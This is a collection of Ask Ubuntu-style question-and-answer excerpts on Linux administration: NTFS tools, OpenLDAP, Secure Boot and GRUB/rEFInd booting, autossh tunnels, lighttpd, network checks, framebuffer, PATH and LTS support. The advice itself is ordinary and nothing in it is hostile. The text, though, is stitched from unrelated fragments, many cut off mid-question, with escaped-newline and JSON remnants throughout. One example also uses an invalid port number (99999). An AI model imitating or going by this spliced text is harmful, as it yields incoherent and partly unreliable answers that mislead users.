utilities based around a shared library.\nThe tools are available for free and come with full source code.\n\n*\n\n*mkntfs: Create an NTFS volume on a partition\n\n*ntfscat: Print a file on the standard output\n\n*ntfsclone: Efficiently backup/restore a volume at the sector level\n\n*ntfscluster: Given a cluster, or sector, find the file\n\n*ntfsfix: Forces Windows to check NTFS at boot time\n\n*ntfsinfo: Dump a file’s attributes, completely\n\n*ntfslabel: Display or set a volume’s label\n\n*ntfslib: Move all the common code into a shared library\n\n*ntfsls: List directory contents\n\n*ntfsresize: Resize an NTFS volume\n\n*ntfsundelete: Find files that have been deleted and recover them\n\n*ntfswipe: Write zeros over the unused parts of the disk\n\n*ntfsdefrag: Defragment files, directories and the MFT\n\n*ntfsck: Perform consistancy checks on a volume\n\n*nttools: Command-line tools to view/change an offline NTFS volume, e.g. ntfscp, ntfsgrep, ntfstouch, ntfsrm, ntfsrmdir, ntfsmkdir\n\n*ntfsdiskedit: Walk the tree of NTFS ondisk structures (and alter them)\nBe careful with these utilities, they might damage the filesystem, or your hard disk !\nWith ntfsprogs installed (sudo apt-get install ntfsprogs),\nExecute the following commands in a terminal:\n$ sudo ntfsfix /dev/partitionName\nAfter this command you should expect the following output:\n~$ sudo ntfsfix /dev/sdb3 Mounting volume...

We recently installed ppolicy module and the related things in our OpenLDAP instance for password policy,\nHowever, among them there was no way to set up something that does a password check whenever a new password is set. Then, we were pointed out to this link, where pwdPolicyChecker seemed like a module that can solve this issue. But we have no idea how to install this C module in our current Ubuntu OpenLDAP set up. Also, the instructions provided seemed to be more like how the OpenLDAP setup used to be earlier in Ubuntu and not like how it is now with slapd.d.\nHas anyone done an installation of a C module in  OpenLDAP in the new Ubuntu setup? Any pointers toward that would be very much appreciated.\nThanks!\n\nA: You must install LDAP extension module to have password quality check feature.

In your terminal, type \"sftp seagate-3e8841.local\". It will try to log into your remote system using your current user name. If your user name on the remote system is different, then do \"sftp user_name@seagate-3e8841.local\" where \"user_name\" is replaced by the user name on the remote system.

It does not give me the option to run alongside windows during installation, tried to make Grub2 pop up manually, but it kept giving me an error. I run UEFI btw.\n\nA: Your question is a bit of a non-sequitur. You've reported at least two unrelated issues, with an implied connection that does not exist in the real world. Specifically, from the title of your question....\n\nCan I disable SecureBoot, even though my motherboard doesn't give me the option to do that?\n\nChances are the option does exist, although you may not have identified it because it's sometimes hidden until you select some other option, or it may be named something non-obvious (such as under a \"Windows mode\" menu or something along those lines). See this page of mine for examples of how to disable Secure Boot on six computers.\nAs noted in my comment to your question, Microsoft requires that Secure Boot be disable-able on computers that ship with Windows 8 or 8.1 for x86 or x86-64. With Windows 10, Microsoft has relaxed this requirement to an option, but as a practical matter, most vendors seem to be keeping the option.\nEven if you can't disable Secure Boot, though, Ubuntu should work with it enabled. This brings me to the text of your question, which has nothing to do with the title....\n\nIt does not give me the option to run alongside windows during installation\n\nThe closest thing to \"run alongside [W]indows\" in the Ubuntu installation process is an option to \"install alongside\" another OS. This option appears well after the Ubuntu installer has booted, so if this is the option to which you're referring, Secure Boot is NOT the problem. A Secure Boot problem will almost certainly manifest as an inability to boot Ubuntu -- including the Ubuntu installation medium. If Secure Boot doesn't like the Ubuntu installer, you won't get as far as a GRUB boot options menu, much less any Ubuntu installation messages. (By \"GRUB boot options menu,\" I mean a menu showing options for how to boot, not a menu with options for how to install GRUB.)\nA failure to see the \"install alongside\" option is common on EFI-based computers. Disabling Fast Startup (a Windows feature, not a firmware option with a similar name), as described here for Windows 8 or here for Windows 10, may work around this issue. If that fails, you'll need to install using the \"something else\" option, as described here, among many other places.\n\ntried to make Grub2 pop up manually, but it kept giving me an error.\n\nI don't know what you mean by this. If you mean that you couldn't boot the installer, then I don't understand your previous comment about not seeing an option to \"run alongside.\" If you're saying that the installer failed to install GRUB, then you must be more precise. Please don't report that a command produced \"an error\"; to understand the problem, we must know the exact error message. If it's in a text-mode program, cut-and-paste the error message. If it's a GUI tool or a text-mode display that doesn't support cutting-and-pasting, take a screen shot, either with software or with a digital camera, and post it with adequate resolution to retain legibility.\n", "Q: New to Ubuntu - wants me to erase disk to install.

When the installation is about to finish, I'm getting an error message stating:\nExecuting 'grub-install /dev/sda6' failed.\nThis is a fatal error.\n<OK>\n\nThen, as per the title of this post, I get a message box that states that the boot loader cannot be installed at the specified location and I have three options:\n1) Choose a different device\n2) Continue without a bootloader\n3) Cancel the installation\nI've tried selecting another partition (/dev/sda4) but get the same error and I don't want to specify /dev/sda1-/dev/sda3 as they are hfs+ partitions and I don't want to corrupt my OS X install.\nI've read the other questions here on the topic but they don't seem to apply to my case, the given answers explain the differences between BIOS and EFI and MBR and GPT, and neither have an accepted answer from the person who posted.\nI don't understand why the Installer is forcing me to specify a Reserved BIOS boot area partition, then complains that it can't use it.\nAny advice on what I should change about the way I've setup my partitions would be most welcome.\n\nA: The message about the \"reserved BIOS boot area\" (what the rest of the world calls a BIOS Boot Partition) indicates that your installer has booted in BIOS/CSM/legacy mode. You might do better with an EFI-mode installation, although there's another way around this issue (see below). First, though, I strongly advise you to exercise caution. Installing a BIOS-mode boot loader to a partition that should not hold it can render all data on the partition inaccessible. If you're lucky, you might be able to recover files with advanced data-recovery tools, but you'll waste a lot of time (your own and others') because of a moment's impatience.\nIn an EFI-mode installation, the boot loader is stored as ordinary files in the EFI System Partition (ESP), which in your case is /dev/sda1. The Ubuntu installer doesn't actually ask where to install GRUB on such systems; it's smart enough to identify the ESP and install GRUB there. If you partition manually, though, the ESP must be appropriately flagged (as an \"EFI boot partition\" on older versions or as an ESP on newer versions). This should happen automatically, but you should not change that identification. Note that this will happen only if you boot the Ubuntu installer in EFI mode, which you apparently have not done. (The installer sets up a BIOS-mode boot loader if it's booted in BIOS mode and an EFI-mode boot loader if it's booted in EFI mode.)\nFinally, to the other way around the issue: You said you're using my rEFInd boot manager. rEFInd doesn't need GRUB -- BIOS-mode or EFI-mode. If you've already installed rEFInd in OS X, and if your Ubuntu installation has completed except for the GRUB installation, you can boot to OS X and install an EFI filesystem driver for ext4fs. See the rEFInd driver documentation and the rEFInd page on booting Linux for lots more details. The mountesp script, which comes with rEFInd, should mount your ESP, enabling you to copy the ext4fs driver, which also comes with rEFInd, to the right location. Alternatively, you can re-run the refind-install script. This is overkill, but the script should detect that Ubuntu is now installed and set up the ext4fs driver automatically. Yet a third option is to use rEFInd on a CD-R or USB flash drive to boot to Ubuntu, then re-install rEFInd via the Debian package or PPA. In any event, once the ext4fs driver is installed, rEFInd should detect your Linux kernels and enable you to boot.\n", "Q: Ubuntu 15.04 systemctl: command not found I am currently trying to install Syncthing and have it start automatically.\nI am following the guide Starting Syncthing Automatically - Using systemd.\nI have a file called \"syncthing@myuser.service\" saved at /etc/systemd/system.

In a nutshell: is it really a good safe idea to leave Secure Boot disabled?\nI have two laptops with LinuxMint,Xuntu, Ubuntu 14&5 Win 10 and Win 8.1 between them. Grub 2 works fine with /,/boot and /home partitions. All this took many reinstalls and fiddling in BIOS, with legacy boot enabled (but UEFI staying on priority) on the Lenovo. \nI love my set up even though at times I need to go back into BIOS as Windows keeps reasserting itself as the priority boot. \nMy question relates to the growing menace of malware, hacker exploits and the advent of new forms of attack such as rootkit and ransomware.\nI groan to think of opening cans of worms by re-enabling Secure Boot. But - perhaps it is worthwhile as a preventive measure to start experimenting and see if I can boot in Secure Boot ON mode now, before the next wave of malware starts taking advantage of those of us who have turned Secure Boot off. Is it time to start armoring up and requiring signed OS's to boot or is it still safe to leave it off and take my chances with the exploits which seem to be proiliferating around the world?\nNote: both use the same MS compliant BIOS Insyde or something like that on HP 2000 Pentium 4 GB ram the otheer is a Lenovo 5080 i3 4 GB ram (yes I will be upgrading memory asap :-))\n\nA: Your question is built upon the false premise that there are such things as \"safe\" and \"unsafe\" practices. There aren't. There are only relative measures of safety -- practice A may be more safe than practice B, but calling practice A \"safe\" is misleading at best.\nWith that in mind, Secure Boot, as the name implies, was designed to increase safety. We could debate how effective it is at doing this, but even if you're very skeptical of it, activating Secure Boot is unlikely to decrease safety, and there are at least theoretical benefits to activating it.\nUbuntu supports Secure Boot, in the sense that Ubuntu ships with a signed Shim program so that the OS can boot with Secure Boot enabled. As doug notes, Ubuntu's GRUB will boot an unsigned kernel, but that's only one possible menace to security -- a computer with Secure Boot disabled will boot any old EFI binary, even one that doesn't rely on GRUB or the Linux kernel in any way. Such a binary could be malicious, so if somebody were to install on your computer, as part of the boot process, a program that writes a megabyte of random data to random sectors on your disk with every boot, you'd be in trouble. Such a program need not rely on GRUB or a Linux kernel; it could be a standalone EFI application. Secure Boot would stand at least a good chance of blocking such a malicious program.\nThe change to GRUB being discussed for 16.04 will make Ubuntu work a bit more like Fedora -- with that change, Ubuntu's GRUB will launch only signed Linux kernels, not unsigned kernels. This should not make it any harder to launch Ubuntu unless you're using your own locally-compiled kernels, since Ubuntu already ships with signed kernels. In either case, with Secure Boot enabled, you need to use Shim to launch GRUB, and Ubuntu ships with a suitable Shim binary. This change, like Secure Boot, will increase safety, but will not make Ubuntu \"safe\" in any absolute sense.\nAs a practical matter, I don't know how common EFI pre-boot malware is. Such tools certainly exist for BIOS, and I've heard of demonstration programs for EFI, but I don't know if they're common \"in the wild.\" Even if they're uncommon today, though, they could become common tomorrow, so protecting yourself makes sense. This protection takes many forms, no one of which is adequate by itself. Secure Boot can be part of that protection, as can virus scanners, firewalls, good account security practices, etc.\nIf you install Ubuntu properly on a system with a functioning Secure Boot system, you shouldn't even notice that Secure Boot is active -- at least, not unless or until you want to do something like compile your own kernel or use a boot program other than GRUB. Your comment that you had to adjust your \"BIOS\" (really EFI) settings to enable BIOS/CSM/legacy support suggests you either have a broken EFI or you did things the hard way. (There are still a lot of pages that give very bad EFI installation advice.) My own Web page on Secure Boot provides background information and practical advice on how to use it (or how to disable it). You may also want to read my page on EFI-mode Linux installations and Adam Williamson's blog post on how EFI works for more background information on EFI-mode booting generally. With a proper understanding, EFI-mode booting with Secure Boot active is not hard to handle.\n", "Q: Unable to chainload OS X Clover bootloader from GRUB So I have a triple-boot setup in which I have just updated OS X (Hackintosh) to the newest version and a new bootloader (from Chimera to Clover). It looks something like this:\n\n\n*\n\n*Ubuntu 14.04 LTS on /dev/sda (hd0)\n\n*Windows 10 Pro on /dev/sdb (hd3)\n\n*OS X 10.11 El Capitan on /dev/sdd (hd2), with the following partitions:\n\n\n*\n\n*gpt1 for the EFI Clover bootloader (67E5-17ED is the UUID for this volume)\n\n*gpt2 for the main OS X disk\n\n\n\nEverything is working fine, and I can boot into each OS from the BIOS with no problem. However, I like to use GRUB as my main bootloader.\n\nPreviously, by having something like this:\nmenuentry \"OS X 10.10\" {\n    insmod hfsplus\n    set root=(hd2,gpt2)\n    multiboot /boot\n}\n\nI was able to chainload to the Chimera bootloader from GRUB with no issues, and from there boot OS X.\n\nHowever, with the new UEFI-based Clover bootloader, no matter wheter I try:\nmenuentry \"OS X 10.11\" {\n    insmod chain\n    insmod part_gpt\n    set root=(hd2,gpt1)\n    chainloader /efi/boot/bootx64.efi\n}\n\nor\nmenuentry \"OS X 10.11\" {\n    insmod part_gpt\n    insmod search_fs_uuid\n    insmod chain\n    search --fs-uuid --no-floppy --set=root 67E5-17ED\n    chainloader ($root)/efi/boot/bootx64.efi\n}\n\nas has been suggested here and here,\nI keep getting an invalid signature error from GRUB when I select \"OS X 10.11\".\nI even tried:\nmenuentry \"OS X 10.11\" {\n    insmod chain\n    insmod part_gpt\n    set root=(hd2,gpt2)\n    chainloader +1\n}\n\nwhich leads to a blank screen with some random characters on the top.\n\nThe problem appears to be the same as this. However, I have Secure Boot disabled in the BIOS preferences.\nAnyway, my question is if there's anything else I can try to chainload these bootloaders together to work like Chimera, or if there's another way to boot directly into OS X from GRUB.\nThanks in advance,\n\nA: You MUST pay attention to your boot mode: BIOS/CSM/legacy or EFI/UEFI.\nThe last I checked, Chimera was strictly a BIOS-mode boot loader. Because GRUB can't change from EFI-mode to BIOS-mode (or vice-versa), this implies that your GRUB is (or at least was) also installed in BIOS mode. If you've switched GRUB from BIOS-mode to EFI-mode, that's a critical detail.\nClover, OTOH, is more complex. Its core is as an EFI-mode boot manager that launches OS X's EFI-mode boot loader; however, Clover includes a complete EFI implementation that runs like a BIOS-mode boot loader -- essentially, an EFI that runs as software on a BIOS-mode computer, rather than as firmware. Thus, Clover can run on either BIOS-mode computers or on EFI-based computers. If you've made no changes to GRUB, you will be able to launch Clover from GRUB only if you've also installed Clover's BIOS-mode EFI \"emulator\" software; and then you'll need to launch Clover much as you had been launching Chameleon. Your first couple of Clover examples (the ones that referenced bootx64.efi) would work on an EFI-based computer running an EFI-mode version of GRUB, but will not work if you're using a BIOS-mode computer. Your final example (with the chainloader +1 line) is for a BIOS-mode boot, and so might work if you've installed Clover's BIOS-mode components.\nStepping back a bit, you may want to examine your other OS components, as well as your computer's capabilities. If your computer was introduced in mid-2011 or later, it's probably EFI-based; but if it's older, it's probably a BIOS-only machine. Ubuntu is easy to switch between boot modes, providing you know how to install suitable boot loaders for each mode. Windows is a little trickier, since it ties its partition table type to its boot mode -- Windows boots in BIOS mode only from MBR disks and in EFI mode only from GPT disks. (I've heard of some exceptions to this rule, but they're pretty exotic.) Thus, switching the Windows boot mode requires changing the partition table and installing a new boot loader.\nBetween all these issues, there's a lot of complexity in your triple-boot setup, and you've omitted the most important details -- namely, the partition table types and boot modes of most of your OSes (although I've inferred some of that information). This makes it difficult to offer specific advice. One point, though: Clover configuration and setup is well beyond the scope of this site. If you want to use GRUB as your primary boot manager, though, you must pay attention to your boot mode and install follow-on boot loaders in the same mode (BIOS/CSM/legacy vs. EFi/UEFI) that GRUB uses.\n\nEDIT:\nGiven your new information, there are several possible ways to proceed. One is, as you suggest, to convert both Windows and Ubuntu to boot in EFI mode. Another is a hybrid setup. One way to do this would be as follows:\n\n\n*\n\n*Download a USB flash drive or CD-R version of my rEFInd boot manager and create a boot medium from it.\n\n*Boot to rEFInd. It should show an option for Ubuntu, and possibly some others. (If there's an OS X option, ignore it; it won't work. If there's a Clover option, it might work.)\n\n*Boot Ubuntu.\n\n*Install the PPA or Debian package version of rEFInd.\n\n*Edit /boot/efi/EFI/refind/refind.conf: Uncomment the scanfor line and add hdbios to the list of options.\n\n*Remove the rEFInd external boot medium and reboot in EFI mode. rEFInd should come up and enable you to boot Ubuntu, and maybe Clover (and from there, OS X). There should also be one or more gray diamond-shaped icons, one of which should boot Windows.\n\n*If you see just one gray icon-shaped icon and it doesn't boot Windows, you must edit refind.conf again, and uncomment the uefi_deep_legacy_scan option. Note that you may need to mount your ESP manually, or add an option to /etc/fstab to do so automatically.\n\n\nYou may need some more tweaking at this point, but that's the basic outline of it. In this configuration, rEFInd will enable you to boot Ubuntu (in EFI mode), Clover (in EFI mode), or Windows (in BIOS mode); and Clover should boot OS X (and may show options for Windows and/or Linux, too).\nSomething similar should be possible with Clover as the primary boot manager; however, with this setup, Clover will show options for OS X (in EFI mode), GRUB (in BIOS mode; or in EFI mode if you install the grub-efi package), and Windows (in BIOS mode). I don't know the exact steps you'd take to set this up. Whether you prefer Clover or rEFInd as your primary boot menu is a matter of personal preference.\nYour plan to convert everything to EFI mode is also workable, but will involve more effort and slightly more risk in the short term. Once set up, you could use GRUB, Clover, or rEFInd as your primary boot manager. If you used GRUB or rEFInd as the primary boot manager, you'd still need Clover to boot OS X; and if you used Clover as the primary boot manager, you'd need to use GRUB or rEFInd to boot Ubuntu.\nYou could use rEFInd on a USB flash drive or CD-R to play with some of these options to see how they'd work, with negligible risk to your configuration, since you'll make no changes to your hard disk.\nIn sum, you've got a lot of options for how to proceed, with no clear winner in terms of ease of use or complexity -- they all should work pretty well, but you'll need two boot managers for at least one OS boot path.\n", "Q: Delete C:/ Windows partition and install Ubuntu? I have 3 disk partions in my Windows 7 laptop. I would like to replace Windows with Ubuntu. But I want to save my data on other 2 partions. Is it possible for me to format C:/ Windows default partition and install Ubuntu on it? For so long I wanted to do this. Appreciate your help.\n\nA: It's possible, but not advised, if you think you'll need to run Windows. \nFor example you may not find a printer driver for Linux and will need to reboot to Windows to print. There is very likely some reason you will want your Windows install back at some point.\nBetter to move your data to your C:/drive and delete one of those data partitions. Then you'll need to manually make multiple partitions where you deleted the one.\nTypically Ubuntu (and all Linux) needs at least two or three partitions, at a minimum I mount / on one partition, /home on another, and use a third for swap.\nSuggestion: \n1 -- Read this page thoroughly until you understand it, it's the page about installing Ubuntu in its own partition. \nIf you decide to go ahead and install Ubuntu in its own partition you will have a good idea of what to expect based on the link above. \nMake sure you understand the part about Master Boot Record and Boot Manager. Not understanding MBR vs. Grub2 will cause a lot of potential headaches that can be avoided by using the Wubi install in the next link. If you want to be unable to boot your computer, messing with boot partitions without a full understanding is a sure ticket!\nTo install Ubuntu in your Windows partition, please review this page about Wubi.\n2 -- Have a backup of Windows and know how to restore it \n3 -- Look at this question (which your in a way duplicates) and make the final decision if you want Wubi or if you are ready to mess with repartitioning. You can test out Wubi now, then later when you are confident you really want to dump Windows, and you understand partitioning better you can try a repartition. You can also attempt to shrink your Windows C:/ partition to keep it and make space for Linux. \nIf you install the right packages in Linux you can see your NTFS drives, so a basic Linux install can easily live on 50-100Gb.\nSummary: I suggest you install Ubuntu in the Windows partition first (Wubi link). Booting a \"live file system\" off a USB stick or CD gets annoyingly slow after a while. Until you really know what you are doing don't delete partitions. It's easy to cause a problem where you can't boot and don't know how to fix it.\nI am sure you understand, formatting C:/Windows will delete your Windows installation. Think of the least harmful approach while you are still getting to know Linux.\n", "Q: autossh forwarded ports left open on connection failure I am trying to establish a reverse SSH tunnel from my home network.  I've got it so that autossh connects successfully once (and only once) per reboot.  I'm forwarding remote ports to my local machine so that I can connect when away from home.  I'm on satellite internet and am behind a double-NAT firewall, so connecting directly to my home network is a non-starter.\nIt seems like the ports on the remote machine are left in an open state when the ssh connection drops out the first time.  Any subsequent attempts to reconnect fail because the ports are already in use.  I can't get things started again until I've rebooted the server, which is less than ideal.\nHaven't had any luck with Google or forum searches so am hoping someone here might point me in the right direction.\nI've configured the server and local machine following the guidance here:\nhttp://linuxaria.com/howto/permanent-ssh-tunnels-with-autossh\nMy connect script is excerpted below and included in /etc/rc.local:\nsu -s /bin/sh autossh -c 'autossh -M 20000 -f -i /home/autossh/.ssh/id_rsa -N -R 99999:localhost:22 autossh@remotehost.com'\n\nCheers and thanks in advance for any help!\nCorey\n\nA: Okay...  Partial solution, tho I'm still not sure it's completely resolved.  I made the following changes and things are at least still connected over night.  I'm not sure whether it will successfully reconnect once the session terminates however.\n\n\n*\n\n*Added the following lines to the remote server sshd_config:\nClientAliveInterval 600\nClientAliveCountMax 12\n\n\n*Modified the rc.local script to launch autossh as follows (added ServerAliveInterval and ServerAliveCountMax options):\nsu -s /bin/sh autossh -c 'autossh -M 20000 -f -i /home/autossh/.ssh/id_rsa -o \"ServerAliveInterval 120\" -o \"ServerAliveCountMax 5\" -N -R 99999:localhost:22 autossh@remotehost.com'\n\nI also found that connecting using the GatewayPort was unreliable. Instead of:\nuser@machine1 $ ssh -p 99999 remotehost.com\n\nI log into the remote host directly and then connect to port 99999 on localhost, ala:\nuser@machine1 $ ssh remotehost.com\nuser@remotehost $ ssh -p 99999 localhost\n\nThis seems to be more reliable.  The gateway port tends to hang.  But if I connect in two steps as above I'm still getting thru.  Will post back with updates once I have a chance to see if it reconnects after an session drops.\nHopefully this might help others!\nCorey\n", "Q: lighttpd shows 404 not found when i enter a subdirectory I have a server running lighttpd, so I could host a website on it.\nBut thing is that when I enter a sub directory such as \"domain.com/example/\" I get a \"404 - Not Found\".\nHere is my lighttpd configuration if you want to take a look at it.\nAny help would be greatly a appreciated. :) \n\nA: I fixed this by adding \n#directory listing\ndir-listing.activate = \"enable\"\ndir-listing.hide-dotfiles = \"enable\"\ndir-listing.encoding = \"utf-8\"\nat the end of the configuration file ;)\n", "Q: ECHO behaviour with and without double quotes with hex Can someone help me to understand behaviour of echo?

The package is called nvidia-prime and should have been automatically installed when you installed the proprietary NVIDIA drivers 352 from Ubuntu repositories.\nOpen NVIDIA X Server Settings (PRIME Profiles) to switch between the graphics adapters.\n\nA: @Sagaryal I concur with @cl-netbox! If you have installed the official Nvidia drivers, and you can access the NVIDIA X Server Settings menu with PRIME profiles with options for switching between Intel (Power Saving) and NVIDIA (Performance) modes, then use that to switch between your GPUs. \nYou'll only need the dGPU for applications like CAD, editing high-res videos, or games. When you need that, switch the cards from the NVIDIA X Server Settings, then log out and back in, and you're done.

For the first (or only) Ethernet interface that would typically be eth0. The output of that command should have at least an entry for inet addr (or inet6 addr with global scope, if you're on an IPv6-only network) to be able to talk to the local internet gateway/router. You can restrict the output to these entries with\nLANG=POSIX ifconfig [INTERFACE] | grep -e 'inet addr:' -e 'inet6 addr:.*Scope:Global'\n\n\n*Find the address of the local gateway/router. It appears in the first line of the output of\nip route\n\nand typically has the form 192.168.x.y or 10.x.x.y (where x is a number between 0 and 255 and y is between 1 and 254), e. g. 192.168.0.1.\nCheck whether the local gateway/router is reachable under its previously determined address:\nping -W 0.5 -c 4 [ADDRESS]\n\nIf this command reports an error message instead of timing information, the gateway is unreachable (disconnected, switched off, unresponsive).\n\n*Check the internet connection by trying to contact a well-known server on the internet:\nping -c 4 google.com\n\nIf the hostname could not be resolved, the local router or the upstream provider may have an (intermittent) DNS issue. You may still be able to contact remote hosts by their IP address:\nping -c 4 8.8.8.8\n\nor in the case of IPv6 networks:\nping6 -c 4 2001:4860:4860::8888\n\nIf neither of these return positive responses, the connection from the local router to your internet provider is likely non-functional. There are rarer cases of a partial outage, where the provider can still be reached, but some or all other networks (like Google's servers in the commands above) are unreachable.\nUnfortunately it is not trivial to determine, whether the issue lies with your local gateway/router/modem setup or on the end of your internet provider.\n", "Q: Random Freeze: Need help with mcelog My newly built computer freezes randomly.

Any drives mounted by mount -a will already be mounted at startup anyway. If not, just run it manually, once. Why run it multiple times?\n\n*That will cause a terminal to appear asking you for your password each time a shell/terminal is started. Why would you want that?\n\n*This is a minor point, but there's absolutely no point in using -i when you're giving sudo a command to run. The -i is only useful when you want to start an interactive root shell. \nIn any case, this is clearly an XY problem.

But it did not help to me (U 14.04.4).\n\nA: Starting from Ubuntu 13.10,  Unity/Gnome moved the keyboard layout changing control from X server to higher level tool: unity-settings-daemon/gnome-settings-daemon plugin to add support for multiple X input methods. So the layout change function in X is just disabled.\nSame for Caps key, X interprets it as capital lock. When you assign it to  layout changing in Unity settings. It will do both as X is not aware of that. So you have to disable caps function in X.\n\n\n*\n\n*The workaround explained in bug report mentioned by Alex.O seem to do that. Which is the same as running:\ngsettings set org.gnome.desktop.input-sources xkb-options \"['caps:none']\"\n\ncaps:none means Caps Lock is disabled, to see all Caps key X supported functions, try:\nmore /usr/share/X11/xkb/rules/xorg.lst | grep caps\n\n\n*To get default function back:\ngsettings reset org.gnome.desktop.input-sources xkb-options\n\n", "Q: Impossible to connect to server through SSH with Filezilla I have a Debian server which had a HDD failure and was re-installed identically (same hostname, same IP, same distro).\nI used to be able to connect via SSH using Filezilla from my Ubuntu desktop but since the server was re-installed, I get the following error:\nStatus :    Connecting to xxxxx.xxxxx.com:22...<br />\nResponse :  fzSftp started<br />\nCommand :   open \"xxxxx@xxxxx.com\" 22<br />\nError : Server unexpectedly closed network connection<br />\nError : Impossible to establish connection to server\n\nI suspect fzSftp refuses to connect because the server fingerprint has changed but I don't know how to delete the old record in order to accept the new one.\nThe worst thing is that I am able to connect with Filezilla from a Windows computer without any problem!\nPlease help me, I already spent hours trying to fix it and it is really anoying!\nEdit: \nI already tried to uninstall/reinstall filezilla, clear cache, delete filezilla hidden files (in user profile)... without success.\nI have no problem to connect using regular FTP and I have no problem connecting SSH via the console.\n\nA: \nError : Server unexpectedly closed network connection\n\n...\n  I suspect fzSftp refuses to connect because the server fingerprint has changed \n\nI doubt this.

For example it would be possible that you use FTP/FTPS on Windows but not SFTP (i.e. SSH) like you try on the Ubuntu desktop. Or it could be that you use a different password or username. Or that there are restrictions on the server side from which IP address a connection is possible, that there is a firewall in between your client and the server ....

I actually don't quite understand what framebuffer is.\nmy /etc/initramfs-tools/conf.d/splash file has this: echo FRAMEBUFFER=y (coz I was following this answer).\nThis shows two ways to detect whether it's enabled. The ls -l /dev/fb* test is positive but the grep -i \"frame buffer\" /var/log/syslog test is negative! LOL LOL XD\n\nA: In a nutshell , there exists part of memory responsible for containing current look of the screen or \"frame\", hence it's called framebuffer. \nUnder Linux ( if we remember that Unix philosophy of \"everything is a file\" ) actual framebuffer device to which you can  write (as root) is /dev/fb0.\nThe graphical X server and several other programs, such as fbi and fbterm are capable of writing to it. I've used here on this site to answer such question as:\nHow can I customize a full-screen console background (TTY)?\nFrankly, I am not quite sure why the answer you linked enables it through the /etc/initramfs-tools/conf.d/splash. According to this, framebuffer support is something that will be enabled in the kernel modules. Here's my output of dmesg log for example: it shows that memory for framebuffer is allocated, despite the fact that i do not have /etc/initramfs-tools/conf.d/splash\n$ grep -i 'frame.*buffer' /var/log/dmesg                       \n[    0.847413] vesafb: framebuffer at 0xd0000000, mapped to 0xffffc90001000000, using 3072k, total 3072k\n[    1.016865] Console: switching to colour frame buffer device 128x48\n[    1.185527] fb0: VESA VGA frame buffer device\n[    7.648201] Console: switching to colour frame buffer device 170x48\n[    7.730459] radeon 0000:01:05.0: fb0: radeondrmfb frame buffer device\n\nPerhaps the answer you linked works on the cited solutions from previous years, but it's not guaranteed that the information is still relevant - linux kernel has added support to a lot of modules and changed to support a lot of different hardware, so potentially solutions changed\nConsider asking an actual question related to your Nvidia graphics. It will save you more time than figuring out all the small details\n\nA: You can use fbset utility (provided by fbset package in Debian and Ubuntu) to set and show various frame buffer settings. With --info (-i) option it is possible to examine some properties like current mode, driver name, etc. Example command output:\n# fbset -i\n\nmode \"1024x768\"\n    geometry 1024 768 1024 768 32\n    timings 0 0 0 0 0 0 0\n    accel true\n    rgba 8/16,8/8,8/0,0/0\nendmode\n\nFrame buffer device information:\n    Name        : mgadrmfb\n    Address     : 0\n    Size        : 0\n    Type        : PACKED PIXELS\n    Visual      : TRUECOLOR\n    XPanStep    : 1\n    YPanStep    : 1\n    YWrapStep   : 0\n    LineLength  : 4096\n    Accelerator : No\n# \n\nSo this tool can tell how the frame buffer is configured in your system.

Now what cause the problem and how I can solve that?\nEdit:\nI change end of ~/.profile to this, but it does not work:\n# set PATH so it includes user's private bin if it exists\nif [ -d \"$HOME/bin\" ] ; then\n    PATH=\"$HOME/bin:$PATH\"\n    PATH=\"$PATH:/usr/local/Android/android-studio/bin\"\nfi\n\n\nA: It looks like you edited this code snippet:\nif [ -d \"$HOME/bin\" ] ; then\n    PATH=\"$HOME/bin:$PATH\"\nfi\n\nwhich is included in ~/.profile by default.\nThe answer which lead you to do so is confusing IMNSHO.\nI'd suggest that you change that code back to what it looked like before, and instead add a new line underneath it:\nif [ -d \"$HOME/bin\" ] ; then\n    PATH=\"$HOME/bin:$PATH\"\nfi\n\nPATH=\"$PATH:/usr/local/Android/android-studio/bin\"\n\nThen, next time you log in, PATH ought to be altered, whether $HOME/bin exists or not.\n\nA: OK, there's a couple issues here:\n\n*\n\n*Use echo $PATH instead of $PATH to check it!\nThe reason for this is that bash replaces $PATH with the contents of that variable everywhere, so just running $PATH tries to execute the contents of the variable, which is nonsense to hte bash interpreter.\n\n\n*You should add the content you added to ~/.profile to ~/.bashrc as well.\n\n\n*Make sure that \"$HOME/bin\" exists by running ls -d $HOME/bin.  If you get an error like bash: ls: No such file or directory. then it doesn't exist.  If it does exist then you should get an output something like /home/[username]/bin.\nIf all those are satisfied then you should be good to go.  If you're not, then just use this command: cd [path_to_studio_directory]; ./studio.sh instead.  That way you will start inside that folder and guarantee its execution.\n", "Q: Web Server in Ubuntu Server vs in Ubuntu Desktop Information about host:\n\n\n*\n\n*I have Ubuntu Desktop 14.04 installed in Hard Disk.

What happens after 5 years LTS period expires?\n- I have not used it for that long, but, I am concerned as to what do I need to do when this period ends?\n\nA: They say a picture is worth a thousand words...\n\nIt's not that bad, but if you get all the way to the end of an LTS, perhaps that an indication you've been ignoring the state of a machine for a little too long. By the time an LTS expires, two more have been released. You should be testing on those well ahead of the last one expiring.\nThe fire and brimstone is essentially what happens with any Linux distribution (hell, even just software) when its support runs out:\n\n\n*\n\n*No more security updates\n\n*No more any other sorts of updates\n\n*The software repositories turn off time time after EOL (not the same day, usually a few months)\n\n*Due to the above, if you leave it too long you could be hacked and then my leading image might not be that inaccurate. Especially if your Ubuntu install is controlling a nuclear power plant, iron smelting operations, evil doomsday machine, etc.\n\n\nSo essentially, just upgrade within that five years. Ubuntu is free but if you're paying somebody to maintain your server, you might have to factor in costings for them doing the work.\nThis is exactly the same for Ubuntu Desktop and Server. They're the same packages. The difference in support timelines stopped after 2010.\nAnd just to point out that LTS support is from its release, not from when you start using it. One of your sentences made it sound like you might have been counting it the wrong way.\n\nA: When the support period expires, you will not get any security updates.\nYou will not be able to install any new software from repositories.\nYou can always upgrade your system to a newer release, or install a new supported system if the upgrade is not available.\n\nA: What happens is the release's End of Life. Security updates, patches and basically all the software from official repositories will be \"blocked\" (you won't be able to install from the Software Center or with apt-get from official repositories, for example). There is an \"old releases\" repository that you can use to get packages, but it's recommended to upgrade to an \"alive\" release.\nThe same happens with regular releases after the 9-month lifespan expires.\n", "Q: Is there some sort of( asymptotic?) threshold limiting tthe number of partitions Ubuntu can handle on my GUID Smartdrives? I have about 3 OS's, including 2 flavors of 'untu, on each of two laptops. So far Ubuntu has been great at handle my predilection for extra partitions. This has been the case with 14.04, 14.10 and 15.04.So far.\nI like lots of small partitions for backups - one around 700MB for CD backups, another another larger one for DVD's, one sized for my old 2GB flashdrives, maybe a 16 and a 32 for transfers with larger USB 3.0 flashdrives. It is easy to wipe unused disk space or entire partitions which is a great convenience and security enhancement.\nI 